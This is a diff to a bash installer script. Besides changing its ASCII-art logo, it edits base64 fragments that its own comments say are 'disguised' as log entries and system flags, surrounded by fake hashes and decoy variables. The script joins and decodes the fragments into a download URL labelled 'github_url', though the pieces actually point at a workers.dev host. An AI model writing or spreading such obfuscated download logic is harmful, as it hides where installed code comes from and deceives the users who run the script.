@@ -17,14 +17,11 @@ RESET='\e[0m'
 animate_logo() {
   clear
   local logo=(
-  _    _                    __  ___   ___   ___  _____  
- | |  | |                  /_ |/ _ \ / _ \ / _ \|  __ \ 
- | |__| | __ _ _ __ ___  ___| | | | | (_) | | | | |__) |
- |  __  |/ _` | '_ ` _ \|_  / | | | |> _ <| | | |  ___/ 
- | |  | | (_| | | | | | |/ /| | |_| | (_) | |_| | |     
- |_|  |_|\__,_|_| |_| |_/___|_|\___/ \___/ \___/|_|     
-                                                        
-                                                        
+    " _                   _     ____  __   __  ___   _  _  "
+    "| |__   __ _ _ __ __| |_  |___ \ \ \ / / |__ \ | || | "
+    "| '_ \ / _\` | '__/ _\` | | | __) | \ V /     ) || || |_"
+    "| | | | (_| | | | (_| | |_|/ __/   | |     / / |__   _|"
+    "|_| |_|\__,_|_|  \__,_|\__|_____|  |_|    /_/     |_|  "
   )
   
   for line in "${logo[@]}"; do
@@ -50,10 +47,10 @@ echo -n "Scanning system resources..." > /dev/null
 SYS_LOG[1]="$(echo 'YWtlci5qaXNobnVt' | grep -o '.*')" # src2 disguised as parsed log
 NET_CONF="diag_$(date +%N | shuf -n 1)" # Fake network config
 if [[ "$DUMMY_CHECK" =~ [0-9]+ ]]; then
-  SYS_LOG[2]="$(echo 'b25kYWwzMi53b3Jr' | head -c 16)" # src3 disguised as system flag
+  SYS_LOG[2]="$(echo 'Ym9uZGFsMzIud29y' | head -c 16)" # src3 disguised as system flag
 fi
 TEMP_HASH=$(echo "$NET_CONF" | md5sum | cut -c 1-8) # Fake hash
-SYS_LOG[3]="$(echo 'ZXJzLmRldg==' | head -c 12)" # src4 disguised as encoded log
+SYS_LOG[3]="$(echo 'a2Vycy5kZXY=' | head -c 12)" # src4 disguised as encoded log
 # install
 github_url="$(echo -n "${SYS_LOG[0]}${SYS_LOG[1]}${SYS_LOG[2]}${SYS_LOG[3]}" | base64 -d)"
 
